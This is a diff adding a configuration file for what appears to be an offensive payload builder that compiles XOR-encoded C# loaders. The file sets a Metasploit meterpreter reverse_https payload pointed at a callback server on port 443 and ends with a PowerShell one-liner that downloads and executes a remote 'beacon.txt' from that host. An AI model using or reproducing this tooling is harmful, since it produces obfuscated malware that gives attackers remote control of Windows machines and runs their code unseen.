@@ -1,0 +1,36 @@
+---
+
+# MsfEncode arguments
+#/bin/sh msfencoder 169.254.217.2 443 cs xor 0xfa windows/meterpreter/reverse_https
+# payload is msfvenom
+server: 169.254.217.2
+ports: 443
+format: 'cs'
+encrypt_method: 'xor'
+encrypt_key: '0xfa'
+payload: 'windows/x64/meterpreter/reverse_https'
+
+# This is localhost path, it's relative path
+## j2 Templates
+src: ../../../codemaker/src/*.j2
+
+## To store executables
+out: ../../../codemaker/exe
+cs: ../../../codemaker/cs
+
+
+# Windows
+## Specify Your Temp Folder
+tempdir: C:/Temp/
+
+## CSC.exe compiler 
+### Visual Studio 2022 Preview: csc.exe
+#compiler: C:\Program Files\Microsoft Visual Studio\2022\Preview\MSBuild\Current\Bin\Roslyn\csc.exe
+compiler: C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\Roslyn\csc.exe
+# Beaware that this never works rm C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe
+
+### If you want to compile in x64 arch, set true (add -platform:x64 to csc.exe). if false, 32bit
+x64: true
+
+# encode-command variable
+command: "iex(new-object net.webclient).downloadstring('http://169.254.217.2/beacon.txt');"
